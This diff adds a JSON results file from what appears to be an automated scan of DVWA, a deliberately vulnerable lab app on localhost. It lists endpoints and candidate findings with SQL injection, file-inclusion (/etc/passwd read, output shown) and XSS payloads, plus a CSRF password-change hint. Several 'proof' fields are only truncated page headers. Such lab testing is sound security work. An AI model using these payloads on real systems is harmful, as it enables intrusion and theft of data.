@@ -1,0 +1,157 @@
+{
+  "ok": true,
+  "summary": "Completed multi-class probe of DVWA vulnerability modules",
+  "surfaces": [
+    {
+      "location": "http://127.0.0.1:8080/login.php",
+      "kind": "auth",
+      "params": [
+        "username",
+        "password",
+        "user_token",
+        "Login"
+      ]
+    },
+    {
+      "location": "http://127.0.0.1:8080/logout.php",
+      "kind": "auth"
+    },
+    {
+      "location": "http://127.0.0.1:8080/setup.php",
+      "kind": "form",
+      "params": [
+        "create_db",
+        "user_token"
+      ]
+    },
+    {
+      "location": "http://127.0.0.1:8080/security.php",
+      "kind": "form",
+      "params": [
+        "security",
+        "seclev_submit",
+        "user_token"
+      ]
+    },
+    {
+      "location": "http://127.0.0.1:8080/vulnerabilities/brute/",
+      "kind": "form"
+    },
+    {
+      "location": "http://127.0.0.1:8080/vulnerabilities/exec/",
+      "kind": "form"
+    },
+    {
+      "location": "http://127.0.0.1:8080/vulnerabilities/csrf/",
+      "kind": "form"
+    },
+    {
+      "location": "http://127.0.0.1:8080/vulnerabilities/fi/",
+      "kind": "form",
+      "params": [
+        "page"
+      ]
+    },
+    {
+      "location": "http://127.0.0.1:8080/vulnerabilities/upload/",
+      "kind": "form"
+    },
+    {
+      "location": "http://127.0.0.1:8080/vulnerabilities/captcha/",
+      "kind": "form"
+    },
+    {
+      "location": "http://127.0.0.1:8080/vulnerabilities/sqli/",
+      "kind": "form"
+    },
+    {
+      "location": "http://127.0.0.1:8080/vulnerabilities/sqli_blind/",
+      "kind": "form"
+    },
+    {
+      "location": "http://127.0.0.1:8080/vulnerabilities/weak_id/",
+      "kind": "form"
+    },
+    {
+      "location": "http://127.0.0.1:8080/vulnerabilities/xss_d/",
+      "kind": "client"
+    },
+    {
+      "location": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "kind": "form"
+    },
+    {
+      "location": "http://127.0.0.1:8080/vulnerabilities/xss_s/",
+      "kind": "form"
+    },
+    {
+      "location": "http://127.0.0.1:8080/vulnerabilities/csp/",
+      "kind": "form"
+    },
+    {
+      "location": "http://127.0.0.1:8080/vulnerabilities/javascript/",
+      "kind": "client"
+    },
+    {
+      "location": "http://127.0.0.1:8080/phpinfo.php",
+      "kind": "file"
+    },
+    {
+      "location": "http://127.0.0.1:8080/config/config.inc.php.bak",
+      "kind": "file"
+    }
+  ],
+  "candidates": [
+    {
+      "title": "SQL Injection in /vulnerabilities/sqli/",
+      "location": "http://127.0.0.1:8080/vulnerabilities/sqli/",
+      "payload": "1' OR '1'='1",
+      "proof": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href=\"../../favicon.ico\" />\r"
+    },
+    {
+      "title": "Blind SQL Injection in /vulnerabilities/sqli_blind/",
+      "location": "http://127.0.0.1:8080/vulnerabilities/sqli_blind/",
+      "proof": "True: \r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-T\nFalse: ERROR: HTTP Error 404: Not Found"
+    },
+    {
+      "title": "File Inclusion in /vulnerabilities/fi/",
+      "location": "http://127.0.0.1:8080/vulnerabilities/fi/",
+      "payload": "/etc/passwd",
+      "proof": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin"
+    },
+    {
+      "title": "Reflected XSS in /vulnerabilities/xss_r/",
+      "location": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "payload": "<script>alert(1)</script>",
+      "proof": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: Reflected Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href="
+    },
+    {
+      "title": "Stored XSS in /vulnerabilities/xss_s/",
+      "location": "http://127.0.0.1:8080/vulnerabilities/xss_s/",
+      "payload": "<script>alert(1)</script>",
+      "proof": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: Stored Cross Site Scripting (XSS) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href=\".."
+    },
+    {
+      "title": "CSRF on Password Change (/vulnerabilities/csrf/)",
+      "location": "http://127.0.0.1:8080/vulnerabilities/csrf/",
+      "proof": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: Cross Site Request Forgery (CSRF) :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href=\"..",
+      "poc_hint": "Password can be changed via GET request with no CSRF token. An attacker can craft a link that changes the password when an authenticated user clicks it."
+    },
+    {
+      "title": "JavaScript Analysis Endpoint",
+      "location": "http://127.0.0.1:8080/vulnerabilities/javascript/",
+      "proof": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: JavaScript Attacks :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href=\"../../favicon.ico"
+    },
+    {
+      "title": "CSP Endpoint Accessible",
+      "location": "http://127.0.0.1:8080/vulnerabilities/csp/",
+      "proof": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: Content Security Policy (CSP) Bypass :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href="
+    }
+  ],
+  "deadends": [
+    "http://127.0.0.1:8080/vulnerabilities/xss_d/",
+    "http://127.0.0.1:8080/vulnerabilities/weak_id/",
+    "http://127.0.0.1:8080/vulnerabilities/captcha/",
+    "http://127.0.0.1:8080/vulnerabilities/upload/"
+  ]
+}
